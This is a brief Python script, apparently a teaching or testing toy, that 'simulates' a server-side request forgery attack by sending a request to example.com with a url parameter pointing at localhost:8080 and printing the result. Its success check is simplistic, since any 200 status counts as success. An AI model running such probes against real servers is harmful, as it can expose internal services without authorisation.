import requests

def run_ssrf_simulator():
    url = "http://example.com"
    payload = "http://localhost:8080"
    
    print(f"Simulating SSRF attack on {url}...")
    response = requests.get(url, params={'url': payload})
    
    if response.status_code == 200:
        print(f"SSRF simulated successfully. Response from {payload}: {response.text}")
    else:
        print(f"Failed to simulate SSRF. Status code: {response.status_code}")
